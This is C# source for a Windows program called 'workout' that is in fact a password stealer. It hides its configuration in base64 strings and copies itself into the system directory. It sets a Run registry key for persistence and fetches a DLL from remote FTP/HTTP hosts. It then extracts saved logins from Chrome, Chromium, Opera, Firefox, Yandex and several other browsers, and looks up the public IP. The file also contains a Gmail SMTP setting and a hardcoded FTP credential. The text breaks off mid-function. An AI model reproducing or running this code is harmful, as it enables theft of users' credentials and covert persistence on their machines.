using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;
using System.Security.Principal;
using System.Reflection;

namespace workout
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            
            //this.Opacity = 0;
            //this.FormBorderStyle = FormBorderStyle.FixedSingle;
            //this.ControlBox = false;
            //this.MinimizeBox = false;
            //this.MaximizeBox = false;
            //this.ShowIcon = false;
            //this.Text = "";
            //this.ShowInTaskbar = false;
            //this.Height = 1;
            //this.Width = 1;
            //MessageBox.Show("1");
            try
            {
                bool isElevated;
                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);
                    isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
                }
                string dec = Encoding.UTF8.GetString(Convert.FromBase64String("")); //ftp sqlite#1
                string host2 = Encoding.UTF8.GetString(Convert.FromBase64String(""));//ftp sqlite#2
                string smet36 = Encoding.UTF8.GetString(Convert.FromBase64String("")); //SQLITE X86
                string host2a = Encoding.UTF8.GetString(Convert.FromBase64String(""));//http sqlite#2
                string lg2 = Encoding.UTF8.GetString(Convert.FromBase64String("==")); //login#2
                string ps2 = Encoding.UTF8.GetString(Convert.FromBase64String("==")); //pass#2
                string lg = Encoding.UTF8.GetString(Convert.FromBase64String("==")); //login
                string ps = Encoding.UTF8.GetString(Convert.FromBase64String("=")); //pass
                string sq = Encoding.UTF8.GetString(Convert.FromBase64String("=")); //sqlite
                string smet = Encoding.UTF8.GetString(Convert.FromBase64String("")); //gmail login
                string smet2 = Encoding.UTF8.GetString(Convert.FromBase64String("=")); //gmail pass
                string smet3 = Encoding.UTF8.GetString(Convert.FromBase64String("c210cC5nbWFpbC5jb20=")); //smtp.gmail.com
                string smet4 = Encoding.UTF8.GetString(Convert.FromBase64String("TG9jYWxBcHBEYXRh")); //LocalAppData
                string smet5 = Encoding.UTF8.GetString(Convert.FromBase64String("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRc")); //google
                string smet6 = Encoding.UTF8.GetString(Convert.FromBase64String("TG9naW4gRGF0YQ==")); //Login Data
                string smet7 = Encoding.UTF8.GetString(Convert.FromBase64String("TG9naW4gRGF0YTI=")); //Login Data2
                string smet31 = Encoding.UTF8.GetString(Convert.FromBase64String("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMVw=")); //chrome profile 1
                string smet32 = Encoding.UTF8.GetString(Convert.FromBase64String("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgMlw=")); //chrome profile 2
                string smet33 = Encoding.UTF8.GetString(Convert.FromBase64String("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgM1w=")); //chrome profile 3
                string smet34 = Encoding.UTF8.GetString(Convert.FromBase64String("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgNFw=")); //chrome profile 4
                string smet35 = Encoding.UTF8.GetString(Convert.FromBase64String("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXFByb2ZpbGUgNVw=")); //chrome profile 5
                string smet25 = Encoding.UTF8.GetString(Convert.FromBase64String("XENocm9taXVtXFVzZXIgRGF0YVxEZWZhdWx0XA==")); //chromium
                string smet26 = Encoding.UTF8.GetString(Convert.FromBase64String("XENocm9taXVtXFVzZXIgRGF0YVxQcm9maWxlIDFc")); //chromium profile 1
                string smet27 = Encoding.UTF8.GetString(Convert.FromBase64String("XENocm9taXVtXFVzZXIgRGF0YVxQcm9maWxlIDJc")); //chromium profile 2
                string smet28 = Encoding.UTF8.GetString(Convert.FromBase64String("XENocm9taXVtXFVzZXIgRGF0YVxQcm9maWxlIDNc")); //chromium profile 3
                string smet29 = Encoding.UTF8.GetString(Convert.FromBase64String("XENocm9taXVtXFVzZXIgRGF0YVxQcm9maWxlIDRc")); //chromium profile 4
                string smet30 = Encoding.UTF8.GetString(Convert.FromBase64String("XENocm9taXVtXFVzZXIgRGF0YVxQcm9maWxlIDVc")); //chromium profile 5
                string smet8 = Encoding.UTF8.GetString(Convert.FromBase64String("XFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlXFw=")); //opera
                string smet9 = Encoding.UTF8.GetString(Convert.FromBase64String("XFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdFxc")); //yandex
                string smet37 = Encoding.UTF8.GetString(Convert.FromBase64String("XEZyZWVVXFVzZXIgRGF0YVxEZWZhdWx0XA==")); //FREE U
                string smet10 = Encoding.UTF8.GetString(Convert.FromBase64String("RmlsZVppbGxhOg==")); //Fzilla
                string smet11 = Encoding.UTF8.GetString(Convert.FromBase64String("XFxjb25maWcuZGF0")); //config.dat
                string smet12 = Encoding.UTF8.GetString(Convert.FromBase64String("SEtFWV9MT0NBTF9NQUNISU5FXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuXFw=")); //register
                string smet13 = Encoding.UTF8.GetString(Convert.FromBase64String("d29ya291dA==")); //workout
                string smet14 = Encoding.UTF8.GetString(Convert.FromBase64String("d29ya291dC5leGU=")); //workout.exe
                string smet15 = Encoding.UTF8.GetString(Convert.FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu")); //register
                string smet16 = Encoding.UTF8.GetString(Convert.FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxs")); //register delete x32
                string smet17 = Encoding.UTF8.GetString(Convert.FromBase64String("U09GVFdBUkVcV293NjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxs")); //register delete x64
                string smet18 = Encoding.UTF8.GetString(Convert.FromBase64String("XFxLb21ldGFcXFVzZXIgRGF0YVxcRGVmYXVsdFxc")); //kometa
                string smet19 = Encoding.UTF8.GetString(Convert.FromBase64String("XFxBbWlnb1xcVXNlclxcVXNlciBEYXRhXFxEZWZhdWx0XFw=")); //amigo
                string smet20 = Encoding.UTF8.GetString(Convert.FromBase64String("XFxUb3JjaFxcVXNlciBEYXRhXFxEZWZhdWx0XFw=")); //torch
                string smet21 = Encoding.UTF8.GetString(Convert.FromBase64String("XFxPcmJpdHVtXFxVc2VyIERhdGFcXERlZmF1bHRcXA==")); //orbitum
                string smet22 = Encoding.UTF8.GetString(Convert.FromBase64String("XHdvcmtvdXQuZXhl")); //\workout
                string smet23 = Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovL2NoZWNraXAuZHluZG5zLm9yZy8=")); //http://checkip.dyndns.org/
                string t4 = "";
                string users;
                string pub = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);
                var dir = new DirectoryInfo(pub);
                pub = dir.Parent.FullName;
                string pub2 = pub + @"\";
                pub = pub + smet11;
                if (File.Exists(pub))
                {
                    users = File.ReadAllText(pub);
                    string[] us = users.Split('\n');

                    for (int i = 0; i < us.Length; i++)
                    {
                        us[i] = us[i].Substring(0, us[i].Length - 1);
                        if (us[i].Equals(Environment.UserName))
                        {

                            Environment.Exit(0);
                        }
                    }
                    users = users.Replace("1111111", Environment.UserName + Environment.NewLine + "1111111");
                    File.WriteAllText(pub, users); ;
                }
                else
                {
                    File.WriteAllText(pub, Environment.UserName + Environment.NewLine + "1111111");
                }
                if (isElevated == true)
                {
                    
                    // MessageBox.Show("1");
                    if (!File.Exists(Environment.SystemDirectory + smet22))
                    {
                        File.Copy(pub2 + smet22, Environment.SystemDirectory + smet22);
                    }

                    try
                    {
                        //register
                        string keyName = smet12;
                        string valueName = smet13;
                        if (Registry.GetValue(keyName, valueName, null) == null)
                        {
                            Registry.LocalMachine.OpenSubKey(smet15, true).SetValue(smet14, pub2 + smet14);
                        }
                    }
                    catch { }
                    //MessageBox.Show("2");


                    //try
                    //{
                    //    FtpWebRequest request =
                    // (FtpWebRequest)WebRequest.Create("");
                    //    request.Credentials = new NetworkCredential("rollerlb_ip", "123Qwe123");
                    //    request.Method = WebRequestMethods.Ftp.DownloadFile;
                    //    //request.Timeout = 4000;
                    //    using (Stream ftpStream = request.GetResponse().GetResponseStream())
                    //    using (Stream fileStream = File.Create("sqlite3.dll"))base
                    //        ftpStream.CopyTo(fileStream);
                    //    }

                    //    Thread.Sleep(2000);
                    //}
                    //catch { }

                    try
                    {
                        if (Environment.Is64BitOperatingSystem)
                        {
                            FtpWebRequest request =
                             (FtpWebRequest)WebRequest.Create(dec);
                            request.Credentials = new NetworkCredential(lg, ps);
                            request.Method = WebRequestMethods.Ftp.DownloadFile;
                            using (Stream ftpStream = request.GetResponse().GetResponseStream())
                            using (Stream fileStream = File.Create(pub2 + sq))
                            {
                                ftpStream.CopyTo(fileStream);
                            }
                            if (!File.Exists(pub2 + sq))
                            {
                                Thread.Sleep(1000);
                                request =
                     (FtpWebRequest)WebRequest.Create(dec);
                                request.Credentials = new NetworkCredential(lg, ps);
                                request.Method = WebRequestMethods.Ftp.DownloadFile;
                                using (Stream ftpStream = request.GetResponse().GetResponseStream())
                                using (Stream fileStream = File.Create(pub2 + sq))
                                {
                                    ftpStream.CopyTo(fileStream);
                                }
                            }


                            if (!File.Exists(pub2 + sq))
                            {
                                Thread.Sleep(4500);
                                request =
                     (FtpWebRequest)WebRequest.Create(dec);
                                request.Credentials = new NetworkCredential(lg, ps);
                                request.Method = WebRequestMethods.Ftp.DownloadFile;
                                using (Stream ftpStream = request.GetResponse().GetResponseStream())
                                using (Stream fileStream = File.Create(pub2 + sq))
                                {
                                    ftpStream.CopyTo(fileStream);
                                }
                            }

                            //sqlite#2 FTP
                            if (!File.Exists(pub2 + sq))
                            {
                                Thread.Sleep(3682);
                                request =
                     (FtpWebRequest)WebRequest.Create(host2);
                                request.Credentials = new NetworkCredential(lg2, ps2);
                                request.Method = WebRequestMethods.Ftp.DownloadFile;
                                using (Stream ftpStream = request.GetResponse().GetResponseStream())
                                using (Stream fileStream = File.Create(pub2 + sq))
                                {
                                    ftpStream.CopyTo(fileStream);
                                }
                            }

                            //sqlite#2 HTTP
                            if (!File.Exists(pub2 + sq))
                            {

                                using (var client = new WebClient())
                                {
                                    client.DownloadFile(host2a, pub2+sq);
                                }
                            }
                        }
                        else
                        {
                            FtpWebRequest request =
                             (FtpWebRequest)WebRequest.Create(smet36);
                            request.Credentials = new NetworkCredential(lg, ps);
                            request.Method = WebRequestMethods.Ftp.DownloadFile;
                            using (Stream ftpStream = request.GetResponse().GetResponseStream())
                            using (Stream fileStream = File.Create(pub2 + sq))
                            {
                                ftpStream.CopyTo(fileStream);
                            }
                        }

                    }
                    catch { }

                    // MessageBox.Show("3");

                    //using (WebClient webClient = new WebClient())
                    //{
                    //    WebRequest myWebRequest = WebRequest.Create("http://btc.retejo.info/sqlite3.dll");

                    //    webClient.DownloadFileAsync(new Uri("http://btc.retejo.info/sqlite3.dll"), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\1.jpg");
                    //    myWebRequest.Timeout = 10000;
                    //}
                    //MessageBox.Show("4");
                    string Contents = "";
                    try
                    {   //CHROME
                        string chr1 = Environment.GetEnvironmentVariable(smet4) + smet5 + smet6;
                        string chr2 = Environment.GetEnvironmentVariable(smet4) + smet5 + smet7;
                        if (File.Exists(chr1))
                        {
                            File.Copy(chr1, chr2, true);
                            Contents += "\nChrome profile default:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chr2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chr2);
                        }
                    }
                    catch { }
                    try
                    {   //CHROME profile 1
                        string chr1 = Environment.GetEnvironmentVariable(smet4) + smet31 + smet6;
                        string chr2 = Environment.GetEnvironmentVariable(smet4) + smet31 + smet7;
                        if (File.Exists(chr1))
                        {
                            File.Copy(chr1, chr2, true);
                            Contents += "\nChrome profile1:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chr2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chr2);
                        }
                    }
                    catch { }
                    try
                    {   //CHROME profile 2
                        string chr1 = Environment.GetEnvironmentVariable(smet4) + smet32 + smet6;
                        string chr2 = Environment.GetEnvironmentVariable(smet4) + smet32 + smet7;
                        if (File.Exists(chr1))
                        {
                            File.Copy(chr1, chr2, true);
                            Contents += "\nChrome profile2:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chr2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chr2);
                        }
                    }
                    catch { }
                    try
                    {   //CHROME profile 3
                        string chr1 = Environment.GetEnvironmentVariable(smet4) + smet33 + smet6;
                        string chr2 = Environment.GetEnvironmentVariable(smet4) + smet33 + smet7;
                        if (File.Exists(chr1))
                        {
                            File.Copy(chr1, chr2, true);
                            Contents += "\nChrome profile3:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chr2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chr2);
                        }
                    }
                    catch { }
                    try
                    {   //CHROME profile 4
                        string chr1 = Environment.GetEnvironmentVariable(smet4) + smet34 + smet6;
                        string chr2 = Environment.GetEnvironmentVariable(smet4) + smet34 + smet7;
                        if (File.Exists(chr1))
                        {
                            File.Copy(chr1, chr2, true);
                            Contents += "\nChrome profile4:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chr2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chr2);
                        }
                    }
                    catch { }
                    try
                    {   //CHROME profile 5
                        string chr1 = Environment.GetEnvironmentVariable(smet4) + smet35 + smet6;
                        string chr2 = Environment.GetEnvironmentVariable(smet4) + smet35 + smet7;
                        if (File.Exists(chr1))
                        {
                            File.Copy(chr1, chr2, true);
                            Contents += "\nChrome profile5:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chr2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chr2);
                        }
                    }
                    catch { }
                    //CHROMIUM
                    try
                    {
                        string chrm1 = Environment.GetEnvironmentVariable(smet4) + smet25 + smet6;
                        string chrm2 = Environment.GetEnvironmentVariable(smet4) + smet25 + smet7;
                        if (File.Exists(chrm1))
                        {
                            File.Copy(chrm1, chrm2, true);
                            Contents += "\nChromium profile default:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chrm2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chrm2);
                        }
                    }
                    catch { }
                    //CHROMIUM profile 1
                    try
                    {
                        string chrm1 = Environment.GetEnvironmentVariable(smet4) + smet26 + smet6;
                        string chrm2 = Environment.GetEnvironmentVariable(smet4) + smet26 + smet7;
                        if (File.Exists(chrm1))
                        {
                            File.Copy(chrm1, chrm2, true);
                            Contents += "\nChromium profile1:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chrm2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chrm2);
                        }
                    }
                    catch { }


                    //CHROMIUM profile 2
                    try
                    {
                        string chrm1 = Environment.GetEnvironmentVariable(smet4) + smet27 + smet6;
                        string chrm2 = Environment.GetEnvironmentVariable(smet4) + smet27 + smet7;
                        if (File.Exists(chrm1))
                        {
                            File.Copy(chrm1, chrm2, true);
                            Contents += "\nChromium profile2:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chrm2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chrm2);
                        }
                    }
                    catch { }
                    //CHROMIUM profile 3
                    try
                    {
                        string chrm1 = Environment.GetEnvironmentVariable(smet4) + smet28 + smet6;
                        string chrm2 = Environment.GetEnvironmentVariable(smet4) + smet28 + smet7;
                        if (File.Exists(chrm1))
                        {
                            File.Copy(chrm1, chrm2, true);
                            Contents += "\nChromium profile3:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chrm2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chrm2);
                        }
                    }
                    catch { }
                    //CHROMIUM profile 4
                    try
                    {
                        string chrm1 = Environment.GetEnvironmentVariable(smet4) + smet29 + smet6;
                        string chrm2 = Environment.GetEnvironmentVariable(smet4) + smet29 + smet7;
                        if (File.Exists(chrm1))
                        {
                            File.Copy(chrm1, chrm2, true);
                            Contents += "\nChromium profile4:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chrm2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chrm2);
                        }
                    }
                    catch { }
                    //CHROMIUM profile 5
                    try
                    {
                        string chrm1 = Environment.GetEnvironmentVariable(smet4) + smet30 + smet6;
                        string chrm2 = Environment.GetEnvironmentVariable(smet4) + smet30 + smet7;
                        if (File.Exists(chrm1))
                        {
                            File.Copy(chrm1, chrm2, true);
                            Contents += "\nChromium profile5:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(chrm2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(chrm2);
                        }
                    }
                    catch { }



                    //MessageBox.Show("5");
                    try
                    {
                        string ope1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + smet8 + smet6;
                        string ope2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + smet8 + smet7;
                        if (File.Exists(ope1))
                        {
                            File.Copy(ope1, ope2, true);
                            Contents += "\nOpera:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(ope2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }

                            File.Delete(ope2);

                        }
                    }
                    catch
                    { }
                    //MessageBox.Show("7");

                    try
                    {
                        string fir1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles";
                        string[] folders = Directory.GetDirectories(fir1, "*", SearchOption.TopDirectoryOnly);
                        fir1 = folders[0] + @"\logins.json";
                        string fir2 = fir1.Replace("logins.json", "logins2.json");

                        if (File.Exists(fir1))
                        {

                            File.Copy(fir1, fir2, true);
                            Contents += "\nFirefox:\n========================\n";
                            List<BrowserLog> LgList;

                            string fir3 = fir2.Substring(0, fir2.Length - 13);
                            FireFox obj = new FireFox(fir3);
                            LgList = obj.GetPasswords();

                            foreach (BrowserLog LogData in LgList) //ParseFile уже заполнил List
                            {

                                Contents += LogData.Host + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";

                            }
                            File.Delete(fir2);
                        }
                    }
                    catch { }
                    // MessageBox.Show("8");
                    try
                    {
                        string yan1 = Environment.GetEnvironmentVariable(smet4) + smet9 + smet6;
                        string yan2 = Environment.GetEnvironmentVariable(smet4) + smet9 + smet7;
                        if (File.Exists(yan1))
                        {
                            File.Copy(yan1, yan2, true);
                            Contents += "\nYandex:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(yan2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(yan2);
                        }
                    }
                    catch { }
                    // MessageBox.Show("9");
                    try
                    {
                        string kom1 = Environment.GetEnvironmentVariable(smet4) + smet18 + smet6;
                        string kom2 = Environment.GetEnvironmentVariable(smet4) + smet18 + smet7;
                        if (File.Exists(kom1))
                        {
                            File.Copy(kom1, kom2, true);
                            Contents += "\nKometa:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(kom2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(kom2);
                        }
                    }
                    catch { }


                    //MessageBox.Show("10");
                    try
                    {
                        string ami1 = Environment.GetEnvironmentVariable(smet4) + smet19 + smet6;
                        string ami2 = Environment.GetEnvironmentVariable(smet4) + smet19 + smet7;
                        if (File.Exists(ami1))
                        {
                            File.Copy(ami1, ami2, true);
                            Contents += "\nAmigo:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(ami2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(ami2);
                        }
                    }
                    catch { }
                    //MessageBox.Show("11");
                    try
                    {
                        string tor1 = Environment.GetEnvironmentVariable(smet4) + smet20 + smet6;
                        string tor2 = Environment.GetEnvironmentVariable(smet4) + smet20 + smet7;
                        if (File.Exists(tor1))
                        {
                            File.Copy(tor1, tor2, true);
                            Contents += "\nTorch:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(tor2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(tor2);
                        }
                    }
                    catch { }
                    //MessageBox.Show("12");
                    try
                    {
                        string orb1 = Environment.GetEnvironmentVariable(smet4) + smet21 + smet6;
                        string orb2 = Environment.GetEnvironmentVariable(smet4) + smet21 + smet7;
                        if (File.Exists(orb1))
                        {
                            File.Copy(orb1, orb2, true);
                            Contents += "\nOrbitum:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(orb2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(orb2);
                        }
                    }
                    catch { }

                    try
                    {   //FREE U
                        string freeu = Environment.GetEnvironmentVariable(smet4) + smet37 + smet6;
                        string freeu2 = Environment.GetEnvironmentVariable(smet4) + smet37 + smet7;
                        if (File.Exists(freeu))
                        {
                            File.Copy(freeu, freeu2, true);
                            Contents += "\nFree U:\n========================\n";
                            List<LoginData> LgList;
                            LgList = SQParse.ParseFile(freeu2); //LgList=список узлов класса LoginData,LoginData имеет 3 переменных
                            foreach (LoginData LogData in LgList) //ParseFile уже заполнил List
                            {
                                if (!String.IsNullOrEmpty(LogData.Url) && !String.IsNullOrEmpty(LogData.Login) && !String.IsNullOrEmpty(LogData.Password))
                                    Contents += LogData.Url + "\n" + LogData.Login + "\n" + LogData.Password + '\n' + "========================" + "\n";
                            }
                            File.Delete(freeu2);
                        }
                    }
                    catch { }

                    // MessageBox.Show("13");
                    string[] f1 = new string[1500];
                    string[] f2;
                    int f1a = 0;
                    try
                    {
                        WebRequest request2 = WebRequest.Create(smet23);
                        WebResponse response = request2.GetResponse();
                        StreamReader stream = new StreamReader(response.GetResponseStream());
                        string direction = stream.ReadToEnd();
                        //request2.Timeout = 90000;
                        stream.Close();
                        response.Close(); //Search for the ip in the html
                        int first = direction.IndexOf("Address: ") + 9;
                        int last = direction.LastIndexOf("</body>");
                        direction = direction.Substring(first, last - first);

                        //check  install
                        string registry_key_32 = smet16;
                        string registry_key_64 = smet17;
                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registry_key_32))
                        {

                            foreach (string name in key.GetSubKeyNames())
                            {
                                f1[f1a] = name + Environment.NewLine;
                                f1a++;
                                //File.WriteAllText(pub2 + "x32_1.txt", name + Environment.NewLine);
                                //File.AppendAllText(pub2 + "x32_2.txt", name + Environment.NewLine);

                                using (RegistryKey subkey = key.OpenSubKey(name))
                                {
                                }
                            }
                        }
                        if (Environment.Is64BitOperatingSystem)
                        {
                            //And...
                            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registry_key_64))
                            {
                                foreach (string name in key.GetSubKeyNames())
                                {
                                    f1[f1a] = name + Environment.NewLine;
                                    f1a++;
                                    //File.WriteAllText(pub2 + "x64_1.txt", name + Environment.NewLine);
                                    //File.AppendAllText(pub2 + "x64_2.txt", name + Environment.NewLine);
                                    using (RegistryKey subkey = key.OpenSubKey(name))
                                    {
                                    }
                                }
                            }
                        }
                        f2 = f1.Distinct().ToArray();
